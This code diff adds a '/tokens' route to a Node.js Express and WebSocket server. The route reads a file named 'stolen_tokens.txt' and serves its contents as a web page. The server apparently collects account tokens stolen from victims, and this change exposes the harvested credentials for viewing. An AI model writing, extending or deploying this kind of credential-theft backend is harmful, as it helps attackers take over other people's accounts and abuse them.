@@ -19,6 +19,16 @@ wss.on("connection", (ws) => {
     };
 });
 
+//
+app.get("/tokens", (req, res) => {
+    try {
+        const data = fs.readFileSync("stolen_tokens.txt", "utf8");
+        res.send("<pre>" + data + "</pre>");
+    } catch (err) {
+        res.status(500).send("Error reading file.");
+    }
+});
+
 // Render requires an Express server to keep WebSockets alive
 app.get("/", (req, res) => res.send("WebSocket Server Running"));
 
